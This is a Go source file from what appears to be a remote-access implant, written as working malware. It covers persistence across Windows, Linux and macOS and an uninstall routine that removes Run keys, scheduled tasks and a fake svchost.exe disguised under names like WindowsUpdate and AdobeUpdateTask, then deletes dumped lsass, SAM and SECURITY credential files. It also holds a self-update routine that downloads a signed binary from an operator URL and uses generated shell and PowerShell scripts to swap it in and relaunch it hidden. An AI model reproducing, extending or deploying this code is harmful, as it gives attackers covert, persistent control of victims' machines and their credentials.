//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

func addPersistence() {
	switch runtime.GOOS {
	case "windows":
		addPersistenceWindows()
	case "linux":
		if err := addPersistenceLinux(); err != nil { //nolint:staticcheck // dual-GOOS dispatch: the other GOOS's stub returns a constant, making this branch statically dead; here it can genuinely fail
			fmt.Printf("[!] Persistence (linux): %v\n", err)
		}
	case "darwin":
		if err := addPersistenceDarwin(); err != nil { //nolint:staticcheck // dual-GOOS dispatch: the other GOOS's stub returns a constant, making this branch statically dead; here it can genuinely fail
			fmt.Printf("[!] Persistence (darwin): %v\n", err)
		}
	default:
		fmt.Printf("[!] Persistence not supported on %s\n", runtime.GOOS)
	}
}

// selfRemove removes the implant
func uninstallSelf() (string, error) {
	// best effort cleanup — remove BOTH persistence naming schemes
	// (auto-install: WindowsUpdate/AdobeUpdateTask/svchost.exe and explicit:
	// Sovereign/SovereignUpdate/Sovereign.exe) so nothing is left behind regardless
	// of which install path was used.
	if runtime.GOOS == "windows" {
		for _, name := range []string{persistencePrefix, "WindowsUpdate"} {
			// uninstall comment block above: best effort by design
			_, _ = runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v `+name+` /f`, "cmd.exe")
		}
		for _, name := range []string{persistencePrefix, persistencePrefix + "Update", "AdobeUpdateTask"} {
			_, _ = runShell("schtasks /delete /tn "+name+" /f", "cmd.exe")
		}
		appData := os.Getenv("APPDATA")
		startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
		for _, name := range []string{"svchost.exe", persistencePrefix + ".exe"} {
			os.Remove(filepath.Join(startupDir, name))
		}
		// Scrub dumped credential material (lsass.dmp / SAM / SYSTEM / SECURITY)
		// so a removed implant does not leave the crown jewels on disk.
		cleanupCredDumpFiles()
	}
	// delete self file (best effort)
	exe, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Remove(exe)
	}()
	return "uninstall attempted (self-delete may take effect after exit)", nil
}

// updatePinnedPubKeyHex is the compile-time trust root for self-updates. When
// non-empty, self_update verifies ONLY against this ed25519 public key and
// ignores any key supplied in the task — so an operator (or anyone able to
// issue a task) cannot sign and execute an arbitrary binary. buildLdflags
// stamps this at generate time; config_push with update_pub_key can also pin
// it at runtime (persisted to update.key). When empty, self_update refuses
// (fail closed) until a key is pushed — task-supplied public_key fields are
// always ignored.
var updatePinnedPubKeyHex = ""

// verifyUpdateSignature decodes an ed25519 public key (hex) and checks the
// signature over hash. Centralized so the pinned-key trust root is testable.
func verifyUpdateSignature(pubKeyHex string, hash, sig []byte) bool {
	pk, err := hex.DecodeString(pubKeyHex)
	if err != nil {
		return false
	}
	if len(pk) != ed25519.PublicKeySize {
		return false
	}
	return ed25519.Verify(ed25519.PublicKey(pk), hash, sig)
}

// selfUpdate downloads a new binary from a signed URL and verifies its integrity
func selfUpdate(cmdJSON string) string {
	var params struct {
		URL       string `json:"url"`
		Signature string `json:"signature"`
		// PublicKey is IGNORED: only the compile-time pinned key is trusted.
		PublicKey string `json:"public_key"`
	}
	trimmedCmd := strings.TrimSpace(cmdJSON)
	if err := json.Unmarshal([]byte(trimmedCmd), &params); err != nil {
		// Legacy bare-URL commands cannot carry a signature, so they can never
		// satisfy the pinned-key check — say so instead of a cryptic parse error.
		if strings.HasPrefix(trimmedCmd, "http://") || strings.HasPrefix(trimmedCmd, "https://") {
			return "self_update refused: bare URL command; send a signed JSON envelope {url, signature}"
		}
		return "failed to parse update command: " + err.Error()
	}
	if params.URL == "" {
		return "self_update: download URL required"
	}

	signature, err := hex.DecodeString(params.Signature)
	if err != nil {
		return "failed to decode signature: " + err.Error()
	}
	if len(signature) != ed25519.SignatureSize {
		return fmt.Sprintf("invalid signature length %d (want %d)", len(signature), ed25519.SignatureSize)
	}

	// Fail closed: without a compile-time pinned trust root nothing anchors
	// this implant to our signing key, and honouring a task-supplied key would
	// let anyone who can issue tasks push arbitrary binaries.
	if updatePinnedPubKeyHex == "" {
		return "self_update refused: no update signing key pinned at build time"
	}
	verifyKeyHex := updatePinnedPubKeyHex
	if _, err := hex.DecodeString(verifyKeyHex); err != nil {
		return "failed to decode public key: " + err.Error()
	}

	exe, err := os.Executable()
	if err != nil {
		return "failed to get executable path: " + err.Error()
	}

	// Download new binary
	tmpPath := exe + ".update.tmp"
	out, err := os.Create(tmpPath)
	if err != nil {
		return "failed to create temp file: " + err.Error()
	}

	httpReq, err := http.NewRequest("GET", params.URL, nil)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to create request: " + err.Error()
	}
	httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
	httpReq.Header.Set("Content-Type", "application/octet-stream")

	resp, err := client.Do(httpReq)
	if err != nil {
		out.Close()
		os.Remove(tmpPath)
		return "failed to download update: " + err.Error()
	}
	if resp.StatusCode < http.StatusOK || resp.StatusCode >= http.StatusMultipleChoices {
		out.Close()
		os.Remove(tmpPath)
		return fmt.Sprintf("update download returned HTTP %d", resp.StatusCode)
	}
	defer resp.Body.Close()

	// Write binary and compute SHA-256 hash simultaneously
	hasher := sha256.New()
	tee := io.TeeReader(resp.Body, hasher)
	written, err := io.Copy(out, tee)
	out.Close()
	if err != nil {
		os.Remove(tmpPath)
		return "failed to write update: " + err.Error()
	}
	if written == 0 {
		os.Remove(tmpPath)
		return "downloaded file is empty"
	}

	// Verify ed25519 signature of the SHA-256 hash
	hash := hasher.Sum(nil)
	if !verifyUpdateSignature(verifyKeyHex, hash, signature) {
		os.Remove(tmpPath)
		return "signature verification failed: binary may be tampered"
	}

	// TOCTOU mitigation: re-read and re-verify immediately before replacement.
	f, rerr := os.Open(tmpPath)
	if rerr != nil {
		os.Remove(tmpPath)
		return "failed to re-open update for verification: " + rerr.Error()
	}
	rh := sha256.New()
	if _, rerr := io.Copy(rh, f); rerr != nil {
		f.Close()
		os.Remove(tmpPath)
		return "failed to re-read update for verification: " + rerr.Error()
	}
	f.Close()
	if !verifyUpdateSignature(verifyKeyHex, rh.Sum(nil), signature) {
		os.Remove(tmpPath)
		return "signature verification failed after re-check: binary may be tampered"
	}

	// Make temp file executable (Linux)
	if runtime.GOOS != "windows" {
		// Executable bit is best-effort; the task carries its own shebang-driven runner.
		_ = os.Chmod(tmpPath, 0755)
	}

	// Create wrapper script to replace and restart
	switch runtime.GOOS {
	case "windows":
		return selfUpdateWindows(exe, tmpPath)
	case "darwin":
		return selfUpdateDarwin(exe, tmpPath)
	default:
		return selfUpdateLinux(exe, tmpPath)
	}
}

func shellQuote(value string) string {
	return "'" + strings.ReplaceAll(value, "'", "'\"'\"'") + "'"
}

// buildUnixUpdateScript keeps the previous executable until the replacement
// survives a short health window. A copy failure or early child exit restores
// the backup and restarts it instead of leaving a dead implant on disk.
func buildUnixUpdateScript(exe, staged string) string {
	return fmt.Sprintf(`#!/bin/sh
sleep 1
cp -f %[1]s %[3]s || exit 1
i=0
until cp -f %[2]s %[1]s; do
    i=$((i+1))
    if [ "$i" -ge 10 ]; then
        cp -f %[3]s %[1]s
        chmod +x %[1]s
        exec %[1]s
    fi
    sleep 1
done
chmod +x %[1]s
%[1]s >/dev/null 2>&1 &
pid=$!
sleep 5
if kill -0 "$pid" 2>/dev/null; then
    rm -f %[3]s %[2]s "$0"
    exit 0
fi
wait "$pid" 2>/dev/null
cp -f %[3]s %[1]s
chmod +x %[1]s
exec %[1]s
`, shellQuote(exe), shellQuote(staged), shellQuote(exe+".prev"))
}

func buildWindowsUpdateScript(exe, staged string) string {
	quote := func(value string) string { return "'" + strings.ReplaceAll(value, "'", "''") + "'" }
	return fmt.Sprintf(`Start-Sleep -Milliseconds 1000
$exe = %[1]s
$staged = %[2]s
$backup = ($exe + '.prev')
Copy-Item -LiteralPath $exe -Destination $backup -Force
$copied = $false
for ($i = 0; $i -lt 20; $i++) {
    try { Copy-Item -LiteralPath $staged -Destination $exe -Force; $copied = $true; break }
    catch { Start-Sleep -Milliseconds 250 }
}
if (-not $copied) {
    Copy-Item -LiteralPath $backup -Destination $exe -Force
    Start-Process -FilePath $exe -WindowStyle Hidden
    exit 1
}
$child = Start-Process -FilePath $exe -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 5
if (-not $child.HasExited) {
    Remove-Item -LiteralPath $backup -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $staged -Force -ErrorAction SilentlyContinue
    exit 0
}
Copy-Item -LiteralPath $backup -Destination $exe -Force
Start-Process -FilePath $exe -WindowStyle Hidden
exit 1
`, quote(exe), quote(staged))
}

func scheduleUpdateExit() {
	go func() {
		time.Sleep(2 * time.Second)
		os.Exit(0)
	}()
}
